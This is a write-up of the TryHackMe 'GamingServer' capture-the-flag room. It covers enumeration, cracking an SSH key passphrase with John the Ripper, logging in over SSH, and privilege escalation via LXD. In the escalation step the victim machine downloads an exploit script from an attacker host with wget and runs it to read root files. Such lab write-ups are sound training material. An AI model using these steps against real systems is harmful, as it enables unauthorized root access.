# GamingServer

[Room Link](https://tryhackme.com/room/gamingserver)

## Enumeration
Using rustscan on the IP we can find 2 open ports: 80 (HTTP) and 22 (SSH)

## Website
The website is meant to promote a new video game, on the surface nothing of note can be found.
Opening the devtools on the homepage reveals a comment written by one of the main developers, the comment is directed to a user called "john".
> john, please add some actual content to the site! lorem ipsum is horrible to look at.

Running gobuster on the website reveals 2 interesting directories: secret and uploads.

Going to the uploads page shows a meme image, the hacker manifesto and a dictionary list, the dictionary list which we download.
The uploads directory shows a private RSA key, we can crack this key using JohnTheRipper giving us the password "letmein"

```sh
ssh2john secretKey > john_ssh.txt
john john_ssh.txt --wordlist=dict.list
```

## SSH
We have gathered enough information to log in using SSH, user john with password letmein gives us access.

```sh
chmod 600 secretKey
ssh -i secretKey john@[ip]
```

After getting into the system I get linpeas on the system using a python3 webserver and wget.
Linpeas shows a user called "lxd" it also tells us this is 99% an attack vector.
If you don't know lxd is a container technology, kinda like Docker.

Now that we have a potential attack vector it's time to research, using searchsploit (exploit-db) I was able to find an exploit on Ubuntu 18.04.
I used [this following exploit](https://www.exploit-db.com/exploits/46978) it was nicely documented and easy to set up.

```sh
# On the attacker machine
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
sudo chmod +x build-alpine
sudo ./build-alpine
python3 -m http.server

# This part is done on the victim
wget http://[attacker-ip]/alpine/alpine-v3.12-x86_64-20200903_1439.tar.gz
wget http://[attacker-ip]/exploit.sh # note: I copied the source code of the exploit to this exploit.sh file
chmod +x exploit.sh
./exploit.sh

# A container will open, this means the exploit has worked
cat /mnt/root/root/root.txt
```

As the exploit mentions the original filesystem can be found at /mnt/root so going over there you can easily snag the root flag

## Conclusion
This was a simple box that can easily be rooted in under half an hour even without knowing about any of the technologies it uses.
This box was also my first time getting to mess around with lxd (and even containers in general) so I'm happy to have learned about it.

